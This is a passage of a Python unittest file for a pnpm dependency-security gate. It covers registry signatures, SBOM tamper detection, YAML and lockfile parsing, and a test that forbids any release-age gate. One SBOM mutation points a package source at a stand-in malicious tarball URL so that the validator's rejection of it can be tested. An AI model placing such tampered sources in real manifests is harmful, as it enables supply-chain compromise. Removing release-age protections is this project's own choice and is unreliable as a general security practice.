            {"message": f"minimatch@11.0.4:{integrity}", "signatures": [signature]},
            {"message": "wrappy@1.0.2:sha512-l4Sp/DRseor9wL6EvV2+TuQn63dMkPjZ/sp9XkghTEbV9KlPS1xUsZ3u7/IQO4wxtcFB4bgpQPRcR3QCvezPcQ==", "signatures": [legacy]},
        ], keys)
        self.assertEqual(verdicts, [["valid"], ["invalid"], ["valid"]])

    def test_expired_key_cannot_sign_a_later_release(self):
        self.policy["registry_signatures"]["keys"][-1]["expires"] = "2020-06-01T00:00:00.000Z"
        self.assertIn(("left-pad@1.3.0", "registry-signature-invalid", ds.BLOCK), self.findings(self.run_gate()))


class SbomGate(Harness):
    def setUp(self):
        super().setUp()
        self.run_gate()

    def test_m_complete_computed_inventory_passes(self):
        status, errors = self.validate_sbom()
        self.assertEqual(status, 0, errors)

    def test_m_missing_duplicate_unknown_tampered_and_orphaned_components_fail(self):
        def edit(mutate):
            document = self.sbom()
            mutate(document)
            return document
        mutations = {
            "missing": lambda d: d["components"].pop(),
            "duplicate": lambda d: d["components"].append(copy.deepcopy(d["components"][0])),
            "unknown": lambda d: d["components"][0].update(version="0.0.0-unreviewed"),
            "integrity": lambda d: d["components"][0]["externalReferences"][0]["hashes"][0].update(content="00" * 64),
            "source": lambda d: d["components"][0]["externalReferences"][0].update(url="https://evil.example/x.tgz"),
            "fabricated edge": lambda d: d["dependencies"][1]["dependsOn"].append(d["dependencies"][2]["ref"]),
            "dangling edge": lambda d: d["dependencies"][1]["dependsOn"].append("pkg:npm/nowhere@1.0.0"),
            "orphan": lambda d: [entry["dependsOn"].clear() for entry in d["dependencies"]],
            "root license": lambda d: d["metadata"]["component"].update(licenses=[{"license": {"id": "MIT"}}]),
            "format": lambda d: d.update(specVersion="1.5"),
        }
        for label, mutate in mutations.items():
            with self.subTest(corruption=label):
                status, errors = self.validate_sbom(edit(mutate))
                self.assertNotEqual(status, 0, label)

    def test_l_sbom_refuses_missing_foreign_or_non_pass_evidence(self):
        evidence_path = self.temp / ds.EVIDENCE_NAME
        good = evidence_path.read_text()
        for label, mutate in (("missing", lambda e: None), ("other revision", lambda e: e.update(revision=OTHER_REVISION)),
                              ("review decision", lambda e: e.update(decision=ds.REVIEW)),
                              ("other lockfile", lambda e: e["lockfile"].update(sha256="0" * 64)),
                              ("other policy", lambda e: e["policy"].update(sha256="0" * 64)),
                              ("package dropped", lambda e: e["packages"].pop())):
            with self.subTest(evidence=label):
                evidence = json.loads(good)
                if label == "missing":
                    evidence_path.unlink()
                else:
                    mutate(evidence)
                    evidence_path.write_text(json.dumps(evidence))
                status, errors = self.validate_sbom()
                self.assertNotEqual(status, 0, label)
                evidence_path.write_text(good)


class GraphParsing(unittest.TestCase):
    def test_yaml_subset_matches_pnpm_shapes(self):
        text = ("# comment\npackages:\n  - packages/*\n  - 'apps/x'\nminimumReleaseAge: 0\noverrides:\n  '@a/b@1.0.0>c': 1.2.3  # trailing\n"
                "  d: '-'\nnested:\n  key: {integrity: sha512-abc==, tarball: 'https://x/y#z'}\n  list: [linux, darwin]\n  empty: {}\n"
                "  flag: true\n  quoted: 'it''s'\n")
        self.assertEqual(ds.parse_yaml(text), {
            "packages": ["packages/*", "apps/x"], "minimumReleaseAge": 0, "overrides": {"@a/b@1.0.0>c": "1.2.3", "d": "-"},
            "nested": {"key": {"integrity": "sha512-abc==", "tarball": "https://x/y#z"}, "list": ["linux", "darwin"], "empty": {},
                       "flag": True, "quoted": "it's"}})
        for invalid in ("a:\n\tb: 1\n", "a: |\n  text\n", "a: 1\na: 2\n", "a: {b: 1\n"):
            with self.subTest(invalid=invalid), self.assertRaises(ValueError):
                ds.parse_yaml(invalid)

    def test_repository_lockfile_is_fully_derived(self):
        graph = ds.Graph((ROOT / "pnpm-lock.yaml").read_text())
        self.assertEqual(len(graph.identities()), len(graph.snapshots))
        self.assertTrue(all(graph.integrity(identity).startswith("sha512-") for identity in graph.identities()))
        self.assertEqual(set(graph.importers), set(ds.workspace_manifests(ROOT, ds.parse_yaml((ROOT / "pnpm-workspace.yaml").read_text()))))
        self.assertEqual(ds.policy_errors(json.loads((ROOT / ds.POLICY_PATH).read_text())), [])

    def test_identity_helpers(self):
        self.assertEqual(ds.base_identity("next@16.4.1(react@19.3.0)(react-dom@19.3.0)"), "next@16.4.1")
        self.assertEqual(ds.dependency_identity("zod", "4.6.6"), "zod@4.6.6")
        self.assertEqual(ds.dependency_identity("alias", "real-pkg@1.0.0"), "real-pkg@1.0.0")
        self.assertIsNone(ds.dependency_identity("@x/y", "link:../y"))


class NoReleaseAgeGate(unittest.TestCase):
    """Test R: no release-age gate, waiver requirement or hidden pnpm default remains."""

    def files(self):
        paths = [".npmrc", "pnpm-workspace.yaml", ds.POLICY_PATH, governance_lite.SBOM_SCRIPT]
        return {path: (ROOT / path).read_text() for path in paths}

    def test_repository_has_no_release_age_gate(self):
        files = self.files()
        self.assertEqual(governance_lite.release_age_errors(files), [])
        self.assertEqual(ds.parse_yaml(files["pnpm-workspace.yaml"])["minimumReleaseAge"], 0)
        self.assertEqual(json.loads(files[ds.POLICY_PATH])["release_age"]["minimum_minutes"], 0)
        self.assertFalse((ROOT / "docs/security/COLOSSEUM-DEPENDENCY-AGE-WAIVER.json").exists())
        for script in ("scripts/dependency_security.py", "scripts/bootstrap-ci.py", "scripts/governance_lite.py", "scripts/sbom_verify.py"):
            body = (ROOT / script).read_text()
            self.assertNotRegex(body, r"timedelta\(\s*(?:minutes=10080|days=7)", script)
            self.assertNotIn("minimumReleaseAgeExclude:", body.replace('"minimumReleaseAgeExclude"', ""), script)

    def test_reintroduced_or_hidden_release_age_fails(self):
        workspace = self.files()["pnpm-workspace.yaml"]
        for label, body in (("seven days", workspace.replace("minimumReleaseAge: 0", "minimumReleaseAge: 10080")),
                            ("one day", workspace.replace("minimumReleaseAge: 0", "minimumReleaseAge: 1440")),
                            ("hidden pnpm default", workspace.replace("minimumReleaseAge: 0\n", "")),
                            ("waiver list", workspace + "minimumReleaseAgeExclude:\n  - left-pad@1.3.0\n"),
                            ("strict mode", workspace + "minimumReleaseAgeStrict: true\n")):
            with self.subTest(change=label):
                self.assertTrue(governance_lite.release_age_errors({**self.files(), "pnpm-workspace.yaml": body}))
        self.assertTrue(governance_lite.release_age_errors({**self.files(), ".npmrc": self.files()[".npmrc"] + "minimum-release-age=10080\n"}))


if __name__ == "__main__":
    unittest.main()
